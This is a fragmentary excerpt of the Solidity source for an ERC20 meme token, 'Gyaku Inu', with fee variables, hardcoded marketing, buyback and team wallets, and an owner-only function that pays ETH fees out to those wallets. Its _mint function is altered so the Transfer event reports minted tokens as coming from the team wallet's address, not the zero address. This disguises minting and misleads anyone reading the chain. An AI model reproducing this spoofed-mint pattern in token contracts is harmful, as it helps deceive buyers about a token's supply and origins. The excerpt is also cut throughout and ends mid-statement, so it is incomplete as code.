...
/**
Gyaku Inu ($GYAKU) The dog of reversal
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0x14F4465724e83571b04DA0902B0FFa0b9cC0Aefa), account, amount);
    }
...
contract GyakuInu is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Gyaku Inu", "GYAKU") {
        ...
        uint256 _buyBuybackFee = 40;
 
        uint256 _sellMarketingFee = 40;
        uint256 _sellLiquidityFee = 0;
        uint256 _sellBuybackFee = 40;
 
        uint256 _earlySellLiquidityFee = 0;
        uint256 _earlySellMarketingFee = 40;
	    uint256 _earlySellBuybackFee = 40;
        ...
        marketingWallet = 0xf197C0aefAe1cA3cFC729f7e8422771582719C86; // marketing wallet
        buybackWallet = 0x0dEfbDa2Ae1f91a9522dc3d388d211e33502C806; // buyback wallet
        teamwallet = 0x14F4465724e83571b04DA0902B0FFa0b9cC0Aefa; // team wallet used for team pay and mods
    ...
    function manualsend() external onlyOwner() {
        ...
        uint256 ethMarketing = amount.mul(earlySellMarketingFee).div(earlySellBuybackFee.add(earlySellMarketingFee));
        uint256 ethTeam = ethMarketing.div(3).mul(1);
        uint256 ethMarket = ethMarketing.div(3).mul(2);
        uint256 ethBuyback = amount.mul(earlySellBuybackFee).div(earlySellBuybackFee.add(earlySellMarketingFee));

        //Send out fees
        if(ethBuyback > 0)
            payable(buybackWallet).transfer(ethBuyback);
        if(ethMarket > 0)
